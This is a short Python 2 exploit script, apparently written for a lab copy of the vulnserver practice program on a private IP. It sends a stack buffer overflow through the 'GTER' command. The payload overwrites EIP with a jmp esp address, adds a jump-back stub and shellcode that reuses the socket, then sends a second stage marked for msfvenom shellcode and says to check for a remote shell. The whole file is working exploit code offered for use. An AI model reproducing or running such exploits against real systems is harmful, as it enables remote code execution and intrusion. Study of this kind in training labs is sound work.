#Python2, for Kali convenience
import os
import sys
import socket
import time

host = "10.0.2.6"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

buf =  "" #put your msfvenom generated shellcode here

buff = "\x33\xf6\x33\xff\x81\xee\x9a\xf9\xff\xff\x56\x81\xef\x68\x9e\xbf\xff\xff\x17\x33\xff\x57\x8b\xf8\x56\x50\x53\x33\xf6\x81\xee\x0c\x9e\xbf\xff\xff\x16\xff\xe7"

print(len(buff))

ebp = "\x42\x42\x42\x42"
fill = "\x90"*(147-(len(buff)+len(ebp)))
eip = "\xaf\x11\x50\x62" #jmp esp 625011af
jmpback = "\x83\xc4\x90" #add esp -70
jmpback += "\xff\xe4" #jmp esp
pad = "\x90"*(20-len(jmpback))

payload = fill + buff + ebp + eip + jmpback + pad

s.recv(1024)
s.send("GTER /.:/" + payload)
raw_input("Press enter to launch payload...")
s.send(buf)
print("Payload sent, check for shell")
